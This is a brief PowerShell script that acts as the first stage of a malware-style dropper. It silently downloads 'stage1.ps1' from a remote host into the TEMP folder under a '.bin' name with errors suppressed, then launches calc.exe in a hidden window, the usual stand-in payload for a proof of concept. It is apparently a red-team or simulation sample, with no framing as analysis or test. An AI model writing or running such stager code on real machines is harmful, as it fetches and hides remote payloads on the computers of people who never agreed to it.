[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://adatum.com/stage1.ps1',
    [string]$DropPath = "$env:TEMP\stage1.bin",
    [int]$StageTimeout = 225
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
